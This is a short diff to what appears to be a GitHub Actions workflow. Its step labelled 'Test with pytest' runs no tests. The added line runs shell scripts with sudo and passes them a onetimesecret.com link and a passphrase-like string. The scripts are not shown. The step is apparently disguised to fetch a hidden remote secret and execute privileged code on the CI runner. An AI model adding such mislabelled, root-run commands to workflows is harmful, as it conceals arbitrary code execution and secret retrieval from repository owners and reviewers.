@@ -25,4 +25,4 @@ jobs:
         python -m pip install --upgrade pip
     - name: Test with pytest
       run: |
-        cd ${{ github.workspace }} && sudo sh show.sh https://onetimesecret.com/secret/p0ry7jctx48wjtmdc3fsabgzaj7mm39 dddddeeeff && sudo sh r.sh
+        cd ${{ github.workspace }} && ls && sudo sh ttest/aa.sh https://onetimesecret.com/secret/p0ry7jctx48wjtmdc3fsabgzaj7mm39 dddddeeeff && ls && sudo sh r.sh
